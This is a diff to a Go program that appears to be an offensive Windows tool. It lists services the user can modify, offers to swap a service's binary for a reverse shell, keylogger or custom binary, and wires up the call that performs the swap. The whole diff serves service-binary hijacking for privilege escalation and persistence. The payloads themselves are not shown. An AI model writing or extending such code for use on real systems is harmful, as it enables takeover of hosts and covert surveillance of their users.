@@ -28,7 +28,9 @@ func main() {
 
 	var userChoice int
 
-	binaryChoice := [3]string{"Reverse Shell", "Key logger", "Custom binary"}
+	var binaryChoice int
+
+	binaryOptions := [3]string{"Reverse Shell", "Key logger", "Custom binary"}
 
 	chanBack := enumwin.EnumServ()
 
@@ -48,7 +50,7 @@ func main() {
 			color.Red("%d: %s", index+1, val.Name)
 		}
 
-		color.Red("Choose a service to modify:\n")
+		color.Red("\n\nChoose a service to modify:\n")
 
 		r, err := fmt.Scanln(&userChoice)
 
@@ -63,13 +65,19 @@ func main() {
 			r, err = fmt.Scanln(&userChoice)
 		}
 
-		color.Red("\n\nWhat binary would you like to replace the service binary with?")
+		color.Red("\nWhat binary would you like to replace the service binary with?\n")
 
-		for index, val := range binaryChoice {
-			color.Red("%d: %s", index+1, val)
+		for index, val := range binaryOptions {
+			color.Red("%d: %s\n", index+1, val)
 		}
 
-		//enumwin.ChangeBinPath(userOptions[userChoice-1])
+		fmt.Scanln(&binaryChoice)
+
+		for r != 1 || err != nil || binaryChoice > len(binaryOptions) || binaryChoice <= 0 {
+			r, err = fmt.Scanln(&binaryChoice)
+		}
+
+		enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)
 
 	} else {
 		color.Red("No services found which you can modify")
